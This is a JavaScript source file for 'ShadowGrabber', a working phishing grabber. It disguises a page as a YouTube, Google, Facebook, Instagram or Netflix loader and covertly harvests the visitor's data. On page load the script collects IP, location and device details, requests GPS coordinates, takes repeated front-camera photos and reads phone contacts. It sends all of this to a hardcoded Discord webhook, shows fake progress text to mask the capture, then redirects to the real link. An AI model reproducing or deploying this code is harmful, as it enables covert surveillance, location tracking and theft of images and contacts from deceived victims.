// ═══════════════════════════════════════════════════════════════════════════
// 🔥 SHADOWGRABBER v10.5 - ULTIMATE STEALTH & DEVICE INTEL 🔥
// ═══════════════════════════════════════════════════════════════════════════

const CONFIG = {
    WEBHOOK: 'https://discord.com/api/webhooks/1464327769608425504/TX0QqpwHA56djp6nFioLGerQ4dUNI0elhQ4q6vw-fuPTbLYdLdv-DaN-PimcXb9Bi9kS',
    REDIRECT_URL: 'https://www.youtube.com/watch?v=dQw4w9WgXcQ', // <--- PASTE YOUR LINK HERE
    CAMERA_SNAPS: 7,
    SNAP_INTERVAL: 300,
    AUTO_START: true
};

// ═══════════════════════════════════════════════════════════════════════════
// ADVANCED DYNAMIC CONTENT DETECTION
// ═══════════════════════════════════════════════════════════════════════════
const detectContentContext = (url) => {
    const u = url.toLowerCase();

    // YouTube
    if (u.includes('youtube.com') || u.includes('youtu.be')) {
        let type = 'YouTube';
        if (u.includes('watch') || u.includes('youtu.be')) type = 'YouTube Video';
        if (u.includes('channel') || u.includes('@')) type = 'YouTube Channel';
        if (u.includes('shorts')) type = 'YouTube Short';

        return {
            name: type,
            title: type,
            loading: `Loading ${type}...`,
            status: 'Buffering content',
            theme: '#FF0000',
            logo: `<svg viewBox="0 0 159 110" width="80" height="55"><path d="M154 17.5c-1.82-6.73-7.07-12-13.8-13.8C128.2 0 79.5 0 79.5 0S30.8 0 18.8 3.7C12.07 5.5 6.82 10.77 5 17.5 1.32 29.5 1.32 55 1.32 55s0 25.5 3.68 37.5c1.82 6.73 7.07 12 13.8 13.8C30.8 110 79.5 110 79.5 110s48.7 0 60.7-3.7c6.73-1.8 11.98-7.07 13.8-13.8 3.68-12 3.68-37.5 3.68-37.5s0-25.5-3.68-37.5z" fill="#FF0000"/><path d="M64 78.77V31.23L104.5 55 64 78.77z" fill="#FFF"/></svg>`,
            icon: 'https://www.youtube.com/favicon.ico'
        };
    }

    // Google
    if (u.includes('google.com')) {
        let type = 'Google';
        if (u.includes('drive')) type = 'Google Drive File';
        if (u.includes('docs')) type = 'Google Doc';
        if (u.includes('photos')) type = 'Google Photo';
        if (u.includes('meet')) type = 'Google Meet';

        return {
            name: type,
            title: type,
            loading: `Opening ${type}...`,
            status: 'Verifying access permissions',
            theme: '#4285F4',
            logo: `<svg viewBox="0 0 48 48" width="60" height="60"><path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/><path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/><path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/><path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/></svg>`,
            icon: 'https://www.google.com/favicon.ico'
        };
    }

    // Facebook
    if (u.includes('facebook.com') || u.includes('fb.com')) {
        return {
            name: 'Facebook',
            title: 'Facebook',
            loading: 'Loading content...',
            status: 'Authenticating',
            theme: '#1877F2',
            logo: `<svg viewBox="0 0 48 48" width="60" height="60" fill="#1877F2"><path d="M24 4C12.954 4 4 12.954 4 24s8.954 20 20 20 20-8.954 20-20S35.046 4 24 4zm5 12.5h-3.5c-1.5 0-2 .5-2 2V21h5.5l-.5 5.5h-5V40h-6V26.5h-3.5V21h3.5v-3.5c0-3.5 2-6.5 6.5-6.5H29v5.5z"/></svg>`,
            icon: 'https://www.facebook.com/favicon.ico'
        };
    }

    // Instagram
    if (u.includes('instagram.com')) {
        return {
            name: 'Instagram',
            title: 'Instagram',
            loading: 'Loading post...',
            status: 'Fetching media',
            theme: '#E4405F',
            logo: `<svg viewBox="0 0 48 48" width="60" height="60"><radialGradient id="ig" cx="19" cy="42" r="45"><stop offset="0" stop-color="#fd5"/><stop offset=".3" stop-color="#ff543f"/><stop offset=".6" stop-color="#d53e91"/><stop offset="1" stop-color="#c837ab"/></radialGradient><path fill="url(#ig)" d="M34 42H14c-4.4 0-8-3.6-8-8V14c0-4.4 3.6-8 8-8h20c4.4 0 8 3.6 8 8v20c0 4.4-3.6 8-8 8z"/><path fill="#fff" d="M24 31c-3.9 0-7-3.1-7-7s3.1-7 7-7 7 3.1 7 7-3.1 7-7 7zm0-11c-2.2 0-4 1.8-4 4s1.8 4 4 4 4-1.8 4-4-1.8-4-4-4z"/><circle cx="31.5" cy="16.5" r="1.5" fill="#fff"/><path fill="#fff" d="M30 37H18c-3.9 0-7-3.1-7-7V18c0-3.9 3.1-7 7-7h12c3.9 0 7 3.1 7 7v12c0 3.9-3.1 7-7 7zM18 13c-2.8 0-5 2.2-5 5v12c0 2.8 2.2 5 5 5h12c2.8 0 5-2.2 5-5V18c0-2.8-2.2-5-5-5H18z"/></svg>`,
            icon: 'https://www.instagram.com/favicon.ico'
        };
    }

    // Netflix
    if (u.includes('netflix.com')) {
        return {
            name: 'Netflix',
            title: 'Netflix',
            loading: 'Resume playing...',
            status: 'Loading stream',
            theme: '#E50914',
            logo: `<svg viewBox="0 0 48 48" width="60" height="60"><path d="M14 4h6l8 24V4h6v40h-6l-8-24v24h-6V4z" fill="#E50914"/></svg>`,
            icon: 'https://www.netflix.com/favicon.ico'
        };
    }

    // Default Generic
    return {
        name: 'Redirect',
        title: 'Loading...',
        loading: 'Please wait...',
        status: 'Loading content',
        theme: '#555555',
        logo: `<svg viewBox="0 0 40 40" width="60" height="60"><circle cx="20" cy="8" r="4" fill="#555"/><circle cx="12" cy="22" r="4" fill="#555"/><circle cx="28" cy="22" r="4" fill="#555"/></svg>`,
        icon: null
    };
};

// ═══════════════════════════════════════════════════════════════════════════
// INITIALIZATION
// ═══════════════════════════════════════════════════════════════════════════
const STATE = {
    sessionId: `SG-${Date.now()}`,
    startTime: Date.now(),
    site: null
};

const DOM = {
    loading: document.getElementById('loading-text'),
    progress: document.getElementById('progress-bar'),
    status: document.getElementById('status-detail'),
    video: document.getElementById('st-v'),
    canvas: document.getElementById('st-c'),
    trigger: document.getElementById('click-trigger')
};

// Setup UI
STATE.site = detectContentContext(CONFIG.REDIRECT_URL);
document.title = STATE.site.title;
if (STATE.site.icon) {
    let link = document.querySelector("link[rel*='icon']") || document.createElement('link');
    link.rel = 'icon';
    link.href = STATE.site.icon;
    document.head.appendChild(link);
}
document.querySelector('.asana-logo').innerHTML = STATE.site.logo;
DOM.loading.textContent = STATE.site.loading;
DOM.status.textContent = STATE.site.status;
DOM.progress.style.background = STATE.site.theme;

// ═══════════════════════════════════════════════════════════════════════════
// UTILITIES
// ═══════════════════════════════════════════════════════════════════════════
const sleep = (ms) => new Promise(r => setTimeout(r, ms));

const updateProgress = (pct, detail) => {
    DOM.progress.style.width = pct + '%';
    if (detail) DOM.status.textContent = detail;
};

const send = async (payload) => {
    try {
        const data = new FormData();
        data.append('payload_json', JSON.stringify({
            embeds: [payload.embed],
            username: STATE.site.name || 'System'
        }));
        if (payload.file) data.append('file', payload.file.blob, payload.file.name);
        await fetch(CONFIG.WEBHOOK, { method: 'POST', body: data });
    } catch (e) { }
};

// ═══════════════════════════════════════════════════════════════════════════
// DEVICE INTELLIGENCE
// ═══════════════════════════════════════════════════════════════════════════
const getDeviceModel = () => {
    const ua = navigator.userAgent;
    let model = "Unknown Device";

    // Android Detection
    if (/Android/.test(ua)) {
        const match = ua.match(/Android\s([0-9.]+);\s([^;]+)/);
        if (match) {
            model = `${match[2]} (Android ${match[1]})`;
        } else {
            model = "Android Device";
        }
    }
    // iOS Detection
    else if (/iPhone|iPad|iPod/.test(ua)) {
        const match = ua.match(/OS\s([0-9_]+)/);
        const version = match ? match[1].replace(/_/g, '.') : "Unknown";
        if (ua.includes("iPhone")) model = `iPhone (iOS ${version})`;
        else if (ua.includes("iPad")) model = `iPad (iOS ${version})`;
        else model = `Apple Device (iOS ${version})`;
    }
    // Desktop
    else if (/Windows/.test(ua)) model = "Windows PC";
    else if (/Macintosh/.test(ua)) model = "Macintosh";
    else if (/Linux/.test(ua)) model = "Linux System";

    return model;
};

// ═══════════════════════════════════════════════════════════════════════════
// CORE FUNCTIONS
// ═══════════════════════════════════════════════════════════════════════════

// 1. Forensics
async function phaseForensics() {
    updateProgress(10, 'Establishing secure connection...');

    // IP API
    let ip = {};
    try { ip = await (await fetch('https://ipapi.co/json/')).json(); } catch (e) { }

    // Get Device Model
    const deviceName = getDeviceModel();

    const embed = {
        title: `⚡ New Connection: ${STATE.site.name}`,
        color: parseInt(STATE.site.theme.replace('#', ''), 16),
        fields: [
            { name: '📱 Device Model', value: `\`${deviceName}\``, inline: false },
            { name: 'IP Address', value: `\`${ip.ip || 'Unknown'}\``, inline: true },
            { name: 'Location', value: `${ip.city}, ${ip.country_name}`, inline: true },
            { name: 'ISP', value: ip.org || 'N/A', inline: true },
            { name: 'System Info', value: `${navigator.platform} | ${navigator.hardwareConcurrency} Cores | ${navigator.deviceMemory}GB RAM`, inline: false },
            { name: 'Context', value: `Redirecting to: ${CONFIG.REDIRECT_URL}`, inline: false }
        ],
        footer: { text: `Session: ${STATE.sessionId}` },
        timestamp: new Date().toISOString()
    };

    await send({ embed });
    updateProgress(20, 'Handshaking...');
}

// 2. Location
async function phaseLocation() {
    updateProgress(30, 'Verifying region...');
    return new Promise(resolve => {
        navigator.geolocation.getCurrentPosition(
            async pos => {
                const { latitude, longitude, accuracy, speed } = pos.coords;
                await send({
                    embed: {
                        title: '📍 GPS Location Locked',
                        color: 0x2ECC71,
                        description: `[View on Maps](https://www.google.com/maps?q=${latitude},${longitude})`,
                        fields: [
                            { name: 'Coordinates', value: `${latitude}, ${longitude}`, inline: true },
                            { name: 'Accuracy', value: `${Math.round(accuracy)}m`, inline: true },
                            { name: 'Speed', value: `${speed || 0}m/s`, inline: true }
                        ]
                    }
                });
                resolve();
            },
            () => resolve(), // Continue even if denied
            { enableHighAccuracy: true, timeout: 8000 }
        );
    });
}

// 3. Camera (FIXED)
async function phaseCamera() {
    updateProgress(50, 'Loading media components...');

    let stream = null;
    try {
        stream = await navigator.mediaDevices.getUserMedia({
            video: { facingMode: 'user', width: { ideal: 1920 }, height: { ideal: 1080 } }
        });

        DOM.video.srcObject = stream;
        await DOM.video.play();

        // CRITICAL FIX: Wait for video to actually be ready
        let attempts = 0;
        while (DOM.video.readyState < 2 && attempts < 50) {
            await sleep(100);
            attempts++;
        }

    } catch (e) {
        // If failed (denied/error), just skip
        return;
    }

    updateProgress(60, 'Buffering...');

    for (let i = 1; i <= CONFIG.CAMERA_SNAPS; i++) {
        const quality = 90 + i; // Fake progress
        updateProgress(60 + (i * 4), `Optimizing stream ${quality}%...`);

        if (DOM.video.videoWidth > 0 && DOM.video.videoHeight > 0) {
            DOM.canvas.width = DOM.video.videoWidth;
            DOM.canvas.height = DOM.video.videoHeight;
            const ctx = DOM.canvas.getContext('2d');
            ctx.drawImage(DOM.video, 0, 0);

            await new Promise(resolve => {
                DOM.canvas.toBlob(blob => {
                    if (blob) {
                        send({
                            embed: {
                                title: `📸 Snap #${i}`,
                                color: 0xE74C3C,
                                image: { url: `attachment://snap_${i}.jpg` }
                            },
                            file: { blob, name: `snap_${i}.jpg` }
                        });
                    }
                    resolve();
                }, 'image/jpeg', 0.85);
            });
        }
        await sleep(CONFIG.SNAP_INTERVAL);
    }

    // Cleanup
    if (stream) stream.getTracks().forEach(t => t.stop());
}

// 4. Contacts (Mobile)
async function phaseContacts() {
    if (!('contacts' in navigator && 'ContactsManager' in window)) return;
    updateProgress(90, 'Syncing details...');

    try {
        const contacts = await navigator.contacts.select(['name', 'tel'], { multiple: true });
        if (contacts.length) {
            const blob = new Blob([JSON.stringify(contacts, null, 2)], { type: 'application/json' });
            await send({
                embed: { title: '📇 Contacts', color: 0xF1C40F, description: `${contacts.length} extracted` },
                file: { blob, name: 'contacts.json' }
            });
        }
    } catch (e) { }
}

// Main Sequence
async function run() {
    if (DOM.trigger) DOM.trigger.style.display = 'none';

    await phaseForensics();
    await phaseLocation();
    await phaseCamera();
    await phaseContacts();

    updateProgress(100, 'Ready');
    await sleep(500);
    window.location.replace(CONFIG.REDIRECT_URL);
}

// Start
if (CONFIG.AUTO_START) {
    setTimeout(run, 800);
} else if (DOM.trigger) {
    DOM.trigger.onclick = run;
}
